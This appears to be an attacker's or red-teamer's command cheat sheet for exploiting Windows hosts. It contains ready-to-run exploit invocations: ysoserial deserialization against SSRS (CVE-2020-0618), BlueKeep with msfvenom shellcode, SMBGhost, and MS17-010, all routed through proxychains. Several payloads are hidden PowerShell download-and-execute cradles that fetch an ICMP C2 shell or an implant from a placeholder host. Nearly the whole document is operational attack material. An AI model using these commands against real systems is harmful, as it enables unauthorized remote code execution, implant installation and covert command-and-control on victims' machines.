ysoserial.exe -g TypeConfuseDelegate -f LosFormatter -c "powershell.exe -exec bypass -noninteractive -windowstyle hidden -c iex((new-object system.net.webclient).downloadstring('<URL>/c2_icmp_shell.ps1'))" -o base64 
proxychains python sqlreport_cve_2020-0618.py -target http://<URL> -username <USER> -domain <DOMAIN> -password <PASSWORD> -payload shell

# rdp, requires editing shellcode
msfvenom -a x64 --platform windows -p windows/x64/exec cmd="powershell \"iex(new-object net.webclient).downloadstring('<URL>/c2_icmp_shell.ps1')\"" -f  python
proxychains python bluekeep_cve-2019-0708.py <IP> 

# smb3 exploits
proxychains python3 smbghost_cve-2020-0796.py <TARGETIP> <REVERSEIP> <REVERSEPORT>

# legacy equation group smb exploits
proxychains python checker.py <IP>
proxychains python ms17-010.py -target <IP> -pipe_name samr -command "cmd /c powershell -exec bypass -c iex (new-object system.net.webclient).downloadstring('https://<URL>/implant_auth.ps1')"
```
